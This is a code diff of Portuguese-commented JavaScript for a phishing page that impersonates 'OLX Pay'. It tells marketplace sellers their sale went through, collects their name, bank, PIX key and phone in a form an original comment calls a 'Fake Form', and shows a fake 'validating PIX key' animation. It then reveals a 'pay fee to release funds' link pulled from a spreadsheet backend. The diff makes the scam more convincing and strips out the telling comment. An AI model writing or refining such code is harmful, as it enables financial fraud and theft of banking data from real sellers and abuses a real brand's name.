@@ -1,6 +1,5 @@
 // ========================================================
 // ⚙️ CONFIGURAÇÃO
-// Coloque aqui a URL do seu Google Apps Script (a mesma usada no Admin)
 const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
 // ========================================================
 
@@ -8,7 +7,6 @@ const mainContainer = document.getElementById('main-container');
 
 // --- Inicialização Automática ---
 (async function init() {
-  // 1. Captura o ID direto da URL (ex: site.com/?id=pay-123)
   const params = new URLSearchParams(window.location.search);
   const id = params.get('id');
 
@@ -17,7 +15,6 @@ const mainContainer = document.getElementById('main-container');
     return;
   }
 
-  // 2. Busca os dados no Backend Seguro
   try {
     const response = await fetch(`${WEB_APP_URL}?id=${id}`);
     const json = await response.json();
@@ -35,25 +32,28 @@ const mainContainer = document.getElementById('main-container');
 
 // --- Função de Renderização Principal ---
 function renderContainer(dadosBrutos) {
-  // Normaliza os dados (transforma chaves em minúsculo para evitar erros de digitação na planilha)
+  // Normaliza os dados para minúsculo (evita erro se na planilha estiver "Link" ou "link")
   const dados = {};
   Object.keys(dadosBrutos).forEach(key => {
     dados[key.toLowerCase()] = dadosBrutos[key];
   });
 
-  // Limpa container
   mainContainer.innerHTML = '';
 
-  // Cria Estrutura
+  // Cria Estrutura Base
   const container = criarElemento('div', { class: 'container' });
   const imgHeader = criarElemento('div', { class: 'header-image' });
   const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
   const content = criarElemento('div', { class: 'content' });
 
-  // Verifica campos opcionais para evitar "undefined" na tela
+  // Variáveis de exibição
   const taxa = dados.taxa || 'R$ --';
   const prazo = dados.prazo || '15 minutos';
-  const linkPagamento = dados.linkpagamento || dados['link pagamento'] || '#';
+  
+  // --- LÓGICA DO LINK DINÂMICO ---
+  // Pega o link que veio do Admin/Planilha. Se estiver vazio, coloca um # para não quebrar.
+  // O script tenta ler variações comuns de nome de coluna.
+  const linkFinal = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
 
   content.innerHTML = `
     <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
@@ -80,7 +80,7 @@ function renderContainer(dadosBrutos) {
     </ul>
   `;
 
-  // Formulário de Validação (Fake Form)
+  // Formulário
   const form = criarElemento('form', { id: 'dadosCliente' });
   const campos = ['nome', 'banco', 'pix', 'telefone'];
   
@@ -95,45 +95,53 @@ function renderContainer(dadosBrutos) {
   form.append(btnEnviar, msgEnvio);
   content.appendChild(form);
 
-  // Botão de Pagamento (Oculto inicialmente)
+  // Botão de Pagamento (Link vindo da Planilha)
   const btnPagamento = criarElemento('a', { 
     id: 'btn-pagamento', 
     class: 'button hidden', 
-    href: linkPagamento 
+    href: linkFinal // Usa a variável dinâmica
   }, 'Pagar Taxa e Liberar Valor');
   
   const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
   content.appendChild(btnContainer);
 
-  // Montagem final
+  // Montagem Final
   container.append(imgHeader, title, content);
   const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
   container.appendChild(footer);
   mainContainer.appendChild(container);
 
-  // Lógica do Formulário
+  // --- LÓGICA DO SUBMIT COM ANIMAÇÃO ---
   form.addEventListener('submit', (e) => {
     e.preventDefault();
     
-    btnEnviar.textContent = "Validando...";
+    // 1. Feedback Visual
+    btnEnviar.innerHTML = `<div class="btn-loading-content"><i class="fa-solid fa-circle-notch fa-spin"></i> Validando chave PIX...</div>`;
     btnEnviar.disabled = true;
     btnEnviar.style.background = "#555";
+    btnEnviar.style.color = "#fff";
 
+    // 2. Simulação de Processamento (2 segundos)
     setTimeout(() => {
+      // Mensagem de Sucesso
       msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
-      msgEnvio.style.color = "#00bfa5"; // Verde
+      msgEnvio.style.color = "#00bfa5";
       msgEnvio.style.fontWeight = "bold";
 
-      // Esconde form e mostra botão
+      // Esconde Form e Mostra Botão
       form.style.display = 'none'; 
+      
       btnPagamento.classList.remove('hidden');
-      btnPagamento.classList.add('visible'); // Se tiver CSS de animação
-      btnPagamento.style.display = 'inline-block'; // Garante display
-    }, 1500);
+      btnPagamento.classList.add('visible');
+      btnPagamento.style.display = 'inline-block'; 
+      
+      // Scroll suave
+      btnPagamento.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    }, 2000);
   });
 }
 
-// --- Função Auxiliar de Erro ---
 function renderError(msg) {
   mainContainer.innerHTML = `
     <div class="container" style="text-align:center; padding:40px;">
@@ -142,7 +150,6 @@ function renderError(msg) {
     </div>`;
 }
 
-// --- Função Auxiliar de Criação de Elementos (Mantida do seu código) ---
 function criarElemento(tag, attrs = {}, inner = '') {
   const el = document.createElement(tag);
   Object.entries(attrs).forEach(([key, value]) => {
